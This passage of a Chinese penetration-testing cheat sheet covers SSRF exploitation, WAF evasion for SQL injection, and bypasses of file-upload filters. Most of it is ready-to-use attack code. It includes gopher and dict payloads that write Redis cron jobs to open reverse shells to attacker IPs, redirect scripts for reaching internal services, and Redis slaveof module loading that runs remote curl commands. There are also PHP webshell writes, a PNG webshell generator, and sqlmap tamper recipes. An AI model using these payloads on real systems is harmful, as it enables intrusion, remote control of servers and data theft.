match=&quot;/&quot;&gt;&lt;xsl:value-of select=&quot;user:xml()&quot;/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</code></pre><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><pre><code>服务端请求伪造构造一个由服务器发出请求的漏洞服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</code></pre><h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><pre><code>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞</code></pre><h5 id="挖掘-1"><a href="#挖掘-1" class="headerlink" title="挖掘"></a>挖掘</h5><pre><code>转码服务在线翻译获取超链接的标题等内容进行显示请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)图片、文章收藏功能对外发起网络请求的地方，网站采集、网页抓取的地方。头像 (远程加载头像)一切要你输入网址的地方和可以输入ip的地方。数据库内置功能(mongodb的copyDatabase函数)邮件系统文件处理在线处理工具从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</code></pre><h6 id="XML-1"><a href="#XML-1" class="headerlink" title="XML"></a>XML</h6><pre><code>&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/evil.dtd&quot;&gt;&lt;!ENTITY % file system &quot;file:///etc/passwd&quot; &gt;&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/file?data=%file&quot;&gt;&lt;!DOCTYPE roottag PUBLIC &quot;-//VSR//PENTEST//EN&quot; &quot;http://wuyun.org/urlin&quot;&gt;&lt;xenc:AgreementMethod Algorithm= &quot;http://wuyun.org/1&quot;&gt;&lt;xenc:EncryptionProperty Target= &quot;http://wuyun.org/2&quot;&gt;&lt;xenc:CipherReference URI= &quot;http://wuyun.org/3&quot;&gt;&lt;xenc:DataReference URI= &quot;http://wuyun.org/4&quot;&gt;&lt;Reference URI=&quot;http://wuyun.org/5&quot;&gt;&lt;To xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;http://wuyun.org/to&lt;/To&gt;&lt;ReplyTo xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;&lt;Address&gt;http://wuyun.org/rto&lt;/Address&gt;&lt;input message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/ip&quot; /&gt;&lt;output message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/op&quot; /&gt;&lt;wsp:PolicyReference URI=“http://wuyun.org/pr&quot;&gt;&lt;fed:Federation FederationID=&quot;http://wuyun.org/fid&quot;&gt;&lt;fed:FederationInclude&gt;http://wuyun.org/inc&lt;/fed:FederationInclude&gt;&lt;fed:TokenIssuerName&gt;http://wuyun.org/iss&lt;/fed:TokenIssuerName&gt;&lt;mex:MetadataReference&gt;&lt;wsa:Address&gt;http://wuyun.org/mex&lt;/wsa:Address&gt;&lt;/mex:MetadataReference&gt;&lt;edmx:Reference URI=&quot;http://wuyun.org/edmxr&quot;&gt;&lt;edmx:AnnotationsReference URI=&quot;http://wuyun.org/edmxa&quot;&gt;&lt;xbrli:identifier scheme=&quot;http://wuyun.org/xbr&quot;&gt;&lt;link:roleType roleURI=&quot;http://wuyun.org/role&quot;&gt;&lt;stratml:Source&gt;http://wuyun.org/stml&lt;/stratml:Source&gt;</code></pre><h6 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h6><h6 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h6><pre><code>db.copyDatabase(&#39;\r\nconfig set dbfilename ssrf\r\nquit\r\n’,&#39;test&#39;,&#39;10.6.4.166:6379&#39;)</code></pre><h6 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h6><pre><code>SELECT dblink_send_query( &#39;host=127.0.0.1 dbname=quit user=\&#39;\r\nconfig set dbfilename wyssrf\r\n\quit\r\n&#39; password=1 port=6379 sslmode=disable&#39;, &#39;select version();’ );</code></pre><h6 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>SELECT openrowset(&#39;SQLOLEDB&#39;, &#39;server=192.168.1.5;uid=sa;pwd=sa;database=master&#39;)SELECT * FROM OpenDatasource(&#39;SQLOLEDB&#39;, &#39;Data Source=ServerName;User ID=sa;Password=sa&#39; ) .Northwind.dbo.Categories</code></pre><h6 id="图片处理函数"><a href="#图片处理函数" class="headerlink" title="图片处理函数"></a>图片处理函数</h6><pre><code>FFmpegconcat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwdImageMagickfill &#39;url(http://wyssrf.wuyun.org)&#39;</code></pre><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><pre><code>测试代码,需安装phpcurl模块apt-get install php7.0-curl&lt;?phpecho &#39;r u ok?&#39;;function curl($url)&#123;  $ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);&#125;$url = $_GET[&#39;url&#39;];curl($url);?&gt;对内网、本地进行端口扫描，获取服务的banner 信息攻击运行在内网或本地的应用程序对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)读取内网资源(如：利用file协议读取本地文件等)跳板无视cdn利用Redis未授权访问，HTTP CRLF注入实现getshell</code></pre><h6 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h6><pre><code>&gt;curl -v &#39;http://192.168.0.110/ssrf.php?url=file:///etc/passwd&#39;</code></pre><p><img src="./img/12.png" alt="image"></p><pre><code>?url=php://filter/read=convert.base64-encode/resource=./1.php</code></pre><h5 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h5><pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/&#39;</code></pre><p><img src="./img/13.png" alt="image"></p><pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info&#39;</code></pre><p><img src="./img/14.png" alt="image"></p><h6 id="SSRF-Redis"><a href="#SSRF-Redis" class="headerlink" title="SSRF+Redis"></a>SSRF+Redis</h6><pre><code>&gt;curl -v &#39;http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p><img src="./img/15.png" alt="image"><br><img src="./img/16.png" alt="image"></p><h6 id="302反弹shell"><a href="#302反弹shell" class="headerlink" title="302反弹shell"></a>302反弹shell</h6><pre><code>?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=flushall302.php&lt;?php$ip = $_GET[&#39;ip&#39;];$port = $_GET[&#39;port&#39;];$scheme = $_GET[&#39;s&#39;];$data = $_GET[&#39;data&#39;];header(&quot;Location: $scheme://$ip:$port/$data&quot;);?&gt;?url=http://xxxx/reverse.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;bhost=*.*.*.*&amp;bport=1234reverse.php&lt;?php$ip = $_GET[&#39;ip&#39;];$port = $_GET[&#39;port&#39;];$bhost = $_GET[&#39;bhost&#39;];$bport = $_GET[&#39;bport&#39;];$scheme = $_GET[&#39;s&#39;];header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;);?&gt;?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dir:/var/spool/cron/?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dbfilename:root?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=save可设置burp–&gt;intruder指定变量跑。</code></pre><h6 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>https://github.com/FoolMitAh/mysql_gopher_attackhttps://fireshellsecurity.team/isitdtu-friss/</code></pre><h6 id="Weblogic-SSRF-Redis"><a href="#Weblogic-SSRF-Redis" class="headerlink" title="Weblogic SSRF+Redis"></a>Weblogic SSRF+Redis</h6><pre><code>探测/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80Redis反弹set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0AaaaSSRF+内网Struct2http://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/</code></pre><h6 id="Ueditor-SSRF"><a href="#Ueditor-SSRF" class="headerlink" title="Ueditor SSRF"></a>Ueditor SSRF</h6><pre><code>/editor/ueditor/php/controller.php?action=catchimage&amp;source[]=http://my.ip/?aaa=1%26logo.png</code></pre><h6 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h6><pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo</code></pre><h6 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h6><pre><code>直接访问http://www.xx.com/ssrf.php?url=http://192.168.0.1</code></pre><p><img src="./img/17.png" alt="image"></p><pre><code>伪造POST请求&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb&#39;</code></pre><h6 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h6><pre><code>本地绕过http://127.0.0.1=http://localhost[::]绕过http://[::]:80=http://127.0.0.1@绕过http://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080利用短网址http://tool.chinaz.com/tools/dwz.aspxhttp://dwz.cn/DNS解析http://www.qq.com.127.0.0.1.xip.io，可解析为127.0.0.1自己域名设置A记录，指向127.0.0.1进制转换127.0.0.1八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433http://www.bejson.com/convert/ip2int/句号127。0。0。1302脚本&lt;?php$ip = $_GET[&#39;ip&#39;];$port = $_GET[&#39;port&#39;];$scheme = $_GET[&#39;s&#39;];$data = $_GET[&#39;data&#39;];header(&quot;Location: $scheme://$ip:$port/$data&quot;);?&gt;攻击方VPS监听8080dict协议dict://www.attack.com:8080/hello:dict等于ssrf.php?url=http://attack.com/302.php?s=dict&amp;ip=www.attack.com&amp;port=8080&amp;data=hello:dictGopher协议gopher:// www.attack.com:8080/gopherssrf.php?url=http://attack.com/302.php?s=gopher&amp;ip=www.attack.com&amp;port=8080&amp;data=gopherFile协议攻击机新建file.php&lt;?phpheader(&quot;Location: file:///etc/passwd&quot;);?&gt;ssrf.php?url=http://attack.com/file.php</code></pre><h6 id="gopher协议的脚本转换"><a href="#gopher协议的脚本转换" class="headerlink" title="gopher协议的脚本转换"></a>gopher协议的脚本转换</h6><pre><code>抓取本地测试的正常请求&gt;socat -v tcp-listen:4444,fork tcp-connect:目标IP:6379</code></pre><p><img src="./img/18.png" alt="image"><br><img src="./img/19.png" alt="image"></p><pre><code>将捕获日志保存txt使用脚本转换为支持gopher协议的字符串转换规则如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。将\r字符串替换成%0d%0a空白行替换为%0a</code></pre><p><img src="./img/20.png" alt="image"></p><pre><code>本地可执行</code></pre><p><img src="./img/21.png" alt="image"></p><pre><code>远程执行需对空格进行编码后再url编码一次*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/192.168.0.108/12138%200&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code></pre><p><img src="./img/22.png" alt="image"><br><img src="./img/23.png" alt="image"><br><img src="./img/24.png" alt="image"></p><h6 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h6><pre><code>Curl版本需低于7.15.1file:可回显时，使用file读取任意文件dict:查看端口，操作内网服务gopher:可发出get/post请求使用gopher协议时，要进行两次url编码http/https:探测存活主机</code></pre><h6 id="dict协议写shell"><a href="#dict协议写shell" class="headerlink" title="dict协议写shell"></a>dict协议写shell</h6><pre><code>?url=dict://127.0.0.1:6379/set:x:&lt;?php phpinfo();?&gt;?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/?url=dict://127.0.0.1:6379/config:set:dbfilename:php.php?url=dict://127.0.0.1:6379/saveUnicode编码?url=dict://127.0.0.1:6379/set:x:&quot;\x3C\x3Fphp\x20echo `$_GET[x]`\x3B\x3F\x3E&quot;</code></pre><h6 id="slaveof复制shell到目标"><a href="#slaveof复制shell到目标" class="headerlink" title="slaveof复制shell到目标"></a>slaveof复制shell到目标</h6><pre><code>From:http://r3start.net/index.php/2020/05/09/683你的redis设置一个shell的键Yourredis&gt;FLUSHALLYourredis&gt;set shell &quot;&lt;?php phpinfo();?&gt;&quot;?url=dict://127.0.0.1:6379/slaveof:yourredisIP:6379?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/?url=dict://127.0.0.1:6379/config:set:dbfilename:test.php?url=dict://127.0.0.1:6379/save?url=dict://127.0.0.1:6379/slaveof:no:one</code></pre><h6 id="slaveof反弹shell"><a href="#slaveof反弹shell" class="headerlink" title="slaveof反弹shell"></a>slaveof反弹shell</h6><pre><code>?url=dict://127.0.0.1:6379/slaveof: yourredisIP:6379?url=dict://127.0.0.1:6379/config:set:dbfilename:exp.so?url=dict://127.0.0.1:6379/MODULE:LOAD:./exp.so?url=dict://127.0.0.1:6379/SLAVEOF:NO:ONE?url=dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb?url=dict://127.0.0.1:6379/system.exec:&#39;curl x.x.x.x/x&#39;?url=dict://127.0.0.1:6379/system.rev:x.x.x.x:8887</code></pre><h4 id="Fuzz-扫描web"><a href="#Fuzz-扫描web" class="headerlink" title="Fuzz/扫描web"></a>Fuzz/扫描web</h4><pre><code>#dirb http://192.168.0.1 /root/asp.txt,/root/dir.txt -a &quot;USER-AGENT&quot; –c &quot;Cookie&quot; -z 100#nikto -C all -h http://192.168.0.107 nikto扫描web服务#wpscan --url http://192.168.0.107/ -e u --wordlist /root/wordlist.txt 枚举用户爆破密码#wpscan --url http://192.168.0.107/ -e vp 扫描漏洞插件#perl joomscan.pl --url 192.168.0.107</code></pre><h5 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h5><pre><code>爆破文件和文件夹&gt;wfuzz -w wordlist URL/FUZZ.php&gt;wfuzz -w wordlist URL/FUZZ枚举数字参数&gt;wfuzz -z range,000-999 -b session=session -b cookie=cookie http://127.0.0.1/getuser.php?uid=FUZZPOST账号密码爆破FUZnZ&gt;wfuzz -w userList -w pwdList -d &quot;username=FUZZ&amp;password=FUZ2Z&quot; http://127.0.0.1/login.php随机HTTP头&gt;wfuzz -z range,0000-9999 -H &quot;X-Forwarded-For: FUZZ&quot; http://127.0.0.1/get.php?userid=666使用代理fuzz&gt;wfuzz -w wordlist -p 127.0.0.1:1087:SOCKS5 URL/FUZZ基础认证爆破&gt;wfuzz -z list,&quot;username-password&quot; --basic FUZZ:FUZZ URL【结果过滤】--hc或--ss不显示符合条件的结果。【结果过滤】--sc或--sl或--sw或--sh显示符合条件的结果。</code></pre><h5 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h5><pre><code>爬行网站存为字典&gt;cewl http://www.qq.com/ -w dict.txt指定字典长度&gt;cewl http://www.qq.com/ -m 9 -w dict.txt网站提取Email&gt;cewl http://www.qq.com/ -n –e</code></pre><h5 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h5><pre><code>&gt;python3 dirsearch.py --random-user-agents --recursive --thread 50 --extension php --plain-text-report report.txt –url http://127.0.0.1</code></pre><h4 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h4><h5 id="SQL注入分块传输"><a href="#SQL注入分块传输" class="headerlink" title="SQL注入分块传输"></a>SQL注入分块传输</h5><pre><code>https://github.com/c0ny1/chunked-coding-converter</code></pre><p><img src="./img/25.png" alt="image"><br><img src="./img/26.png" alt="image"></p><pre><code>跑注入点被拦截</code></pre><p><img src="./img/27.png" alt="image"></p><pre><code>使用分块传输，右键选择</code></pre><p><img src="./img/28.png" alt="image"><br><img src="./img/30.png" alt="image"></p><pre><code>使用SQLMAP跑注入</code></pre><p><img src="./img/31.png" alt="image"><br><img src="./img/32.png" alt="image"></p><pre><code>&gt;python sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs</code></pre><p><img src="./img/33.png" alt="image"></p><h5 id="自动提供可用的tamper"><a href="#自动提供可用的tamper" class="headerlink" title="自动提供可用的tamper"></a>自动提供可用的tamper</h5><pre><code>https://github.com/m4ll0k/AtlasGET类型的注入python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -vPOST类型的注入python atlas.py --url http://site.com/index/id/ -m POST -D &#39;test=%%10%%&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v请求头注入python atlas.py --url http://site.com/index/id/ -H &#39;User-Agent: mozilla/5.0%%inject%%&#39; -H &#39;X-header: test&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v组合tamperpython atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --concat &quot;equaltolike,htmlencode&quot; --random-agent -v列出tamperpython atlas.py -g例子注入python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3</code></pre><p><img src="./img/658.png" alt="image"></p><pre><code>可以看到被拦截了查找能绕过的tamperpython atlas.py --url &#39;http://site.com/index.php?id=Price_ASC&#39; --payload=&quot;&#39;) AND 8716=4837 AND (&#39;yajr&#39;=&#39;yajr&quot; --random-agent -v</code></pre><p><img src="./img/659.png" alt="image"></p><pre><code>根据返回码200得到一个可绕过waf的tamperversionedkeywords这个tamper继续注入python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3 --tamper=versionedkeywords根据状态码来判断有时会有点鸡肋，但是也能用用，随机发挥吧。</code></pre><h5 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h5><pre><code>#coding=utf-8import random,stringfrom urllib import parse# code by yzddMr6varname_min = 5varname_max = 15data_min = 20data_max = 25num_min = 50num_max = 100def randstr(length):    str_list = [random.choice(string.ascii_letters) for i in range(length)]    random_str = &#39;&#39;.join(str_list)    return random_strdef main():    data=&#123;&#125;    for i in range(num_min,num_max):        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))    print(&#39;&amp;&#39;+parse.urlencode(data)+&#39;&amp;&#39;)main()放到要注入的字段前后</code></pre><h5 id="上传bypass"><a href="#上传bypass" class="headerlink" title="上传bypass"></a>上传bypass</h5><h6 id="图片文件头"><a href="#图片文件头" class="headerlink" title="图片文件头"></a>图片文件头</h6><pre><code>PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0AGIF 为 47 49 46 38 37 61JPG 为 FF D8 FF E0</code></pre><h6 id="添加图片头或合并图片包含"><a href="#添加图片头或合并图片包含" class="headerlink" title="添加图片头或合并图片包含"></a>添加图片头或合并图片包含</h6><h6 id="后缀大小写"><a href="#后缀大小写" class="headerlink" title="后缀大小写"></a>后缀大小写</h6><h6 id="文件名前缀加-0x09"><a href="#文件名前缀加-0x09" class="headerlink" title="文件名前缀加[0x09]"></a>文件名前缀加[0x09]</h6><h6 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h6><pre><code>SetHandler application/x-httpd-php</code></pre><h6 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h6><pre><code>GIF找好一个大一点的GIF，尾部使用c32插入shell，上传，下载回来，使用burp的comparer功能找出整个文件没有被渲染的位置，插入shell再上传JPG使用脚本直接生成https://github.com/BlackFan/jpg_payloadPNG使用脚本直接生成先取消php.ini注释;extension=php_gd2.dll&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,       0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;    $r = $p[$y];    $g = $p[$y+1];    $b = $p[$y+2];    $color = imagecolorallocate($img, $r, $g, $b);    imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#39;./1.png&#39;);?&gt;</code></pre><h6 id="上传php3-php4-phtml等"><a href="#上传php3-php4-phtml等" class="headerlink" title="上传php3,php4,phtml等"></a>上传php3,php4,phtml等</h6><h6 id="文件名后加-DATA"><a href="#文件名后加-DATA" class="headerlink" title="文件名后加::$DATA"></a>文件名后加::$DATA</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA&quot;ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA\0x00\1.asp0x00.jpg&quot;</code></pre><h6 id="asp-空格"><a href="#asp-空格" class="headerlink" title="asp . (空格+.)"></a>asp . (空格+.)</h6><h6 id="php-点-空格-点"><a href="#php-点-空格-点" class="headerlink" title="php. .(点+空格+点)"></a>php. .(点+空格+点)</h6><h6 id="双写phphpp"><a href="#双写phphpp" class="headerlink" title="双写phphpp"></a>双写phphpp</h6><h6 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h6><pre><code>Get参数00截断直接添加%00POST参数00截断修改hex为00</code></pre><h6 id="修改一些固定的参数"><a href="#修改一些固定的参数" class="headerlink" title="修改一些固定的参数"></a>修改一些固定的参数</h6><h6 id="文件名去掉双引号"><a href="#文件名去掉双引号" class="headerlink" title="文件名去掉双引号"></a>文件名去掉双引号</h6><h6 id="加一个filename1的参数"><a href="#加一个filename1的参数" class="headerlink" title="加一个filename1的参数"></a>加一个filename1的参数</h6><h6 id="form变量改成f-orm"><a href="#form变量改成f-orm" class="headerlink" title="form变量改成f+orm"></a>form变量改成f+orm</h6><h6 id="去掉form-data"><a href="#去掉form-data" class="headerlink" title="去掉form-data"></a>去掉form-data</h6><h6 id="在Content-Disposition或form-data-后添加多个空格"><a href="#在Content-Disposition或form-data-后添加多个空格" class="headerlink" title="在Content-Disposition或form-data;后添加多个空格"></a>在Content-Disposition或form-data;后添加多个空格</h6><h6 id="引号回车"><a href="#引号回车" class="headerlink" title="引号回车"></a>引号回车</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;backlion.asp&quot;</code></pre><h6 id="Content-Type和ConTent-Disposition调换位置"><a href="#Content-Type和ConTent-Disposition调换位置" class="headerlink" title="Content-Type和ConTent-Disposition调换位置"></a>Content-Type和ConTent-Disposition调换位置</h6><h6 id="文件名前缀加空格"><a href="#文件名前缀加空格" class="headerlink" title="文件名前缀加空格"></a>文件名前缀加空格</h6><pre><code>filename=    &quot;1.asp&quot;</code></pre><h6 id="name前加空格"><a href="#name前加空格" class="headerlink" title="name前加空格"></a>name前加空格</h6><pre><code>Content-Disposition: form-data;      name=&quot;uploaded&quot;; filename=&quot;1.asp&quot;</code></pre><h6 id="form-data的前后加上"><a href="#form-data的前后加上" class="headerlink" title="form-data的前后加上+"></a>form-data的前后加上+</h6><pre><code>Content-Disposition: +form-data; name=&quot;filepath&quot;; filename=&quot;1.asp&quot;</code></pre><h5 id="ASP-IIS"><a href="#ASP-IIS" class="headerlink" title="ASP+IIS"></a>ASP+IIS</h5><pre><code>s%elect&gt;selects%u0065lect&gt;select  s%u00f0lect&gt;selects%u0045lect = s%u0065lect = %u00f0lectu --&gt;%u0055 --&gt; %u0075n --&gt;%u004e --&gt; %u006ei --&gt;%u0049 --&gt; %u0069o --&gt;%u004f --&gt; %u006f --&gt;%u00bas --&gt;%u0053 --&gt; %u0073l --&gt;%u004c --&gt; %u006ce --&gt;%u0045 --&gt; %u0065--&gt;%u00f0c --&gt;%u0043 --&gt; %u0063t --&gt;%u0054 --&gt;%u0074 --&gt;%u00de --&gt;%u00fef --&gt;%u0046 --&gt;%u0066r --&gt;%u0052 --&gt;%u0072m --&gt;%u004d --&gt;%u006d</code></pre><h5 id="Asp-iis-amp-aspx-iis"><a href="#Asp-iis-amp-aspx-iis" class="headerlink" title="Asp+iis&amp;aspx+iis"></a>Asp+iis&amp;aspx+iis</h5><pre><code>s%u006c%u0006ect&gt;select</code></pre><h5 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h5><pre><code>TEST /sql.php?id=1 HTTP/1.1</code></pre><h5 id="大小写-关键字"><a href="#大小写-关键字" class="headerlink" title="大小写/关键字"></a>大小写/关键字</h5><pre><code>UniOn SeLECTMid()substring()  substr()Hex()ascii()sleep() =benchmark()concat_ws()=group_concat()</code></pre><h5 id="双重url编码"><a href="#双重url编码" class="headerlink" title="双重url编码"></a>双重url编码</h5><h5 id="变换请求方式"><a href="#变换请求方式" class="headerlink" title="变换请求方式"></a>变换请求方式</h5><h5 id="HPP参数污染"><a href="#HPP参数污染" class="headerlink" title="HPP参数污染"></a>HPP参数污染</h5><pre><code>id=1&amp;id=2&amp;id=3得到的结果：Asp.net + iis：id=1,2,3 Asp+iis：id=1,2,3 Php+apache：id=3MSSQL:GET+POST: GET:http://192.168.125.140/test/sql.aspx?id=1 union/*post:  id=2*/select null,null,null无逗号形式：?id=1 union select 1&amp;id=2&amp;id=3&amp;id=4 from admin--（）  利用逗号：?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--无效参数形式：?a=/*&amp;sql=xxx&amp;b=*/  a,b为无效参数溢出形式：?id=1/*&amp;id=*//*&amp;id=*//*......&amp;id=*//*&amp;id=*/ union  select null,system_user,null from INFORMATION_SCHEMA.schemataMYSQL：?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=….. &amp;id=1 union select 1,2 from admin</code></pre><h5 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h5><h6 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h6><pre><code>空格符%09、%0a、%0c、%0d、%16</code></pre><h6 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>注释符#、/*...*/、--[空格] ...空格符[0x09,0x0a-0x0d,0x20,0xa0]特殊符号%a 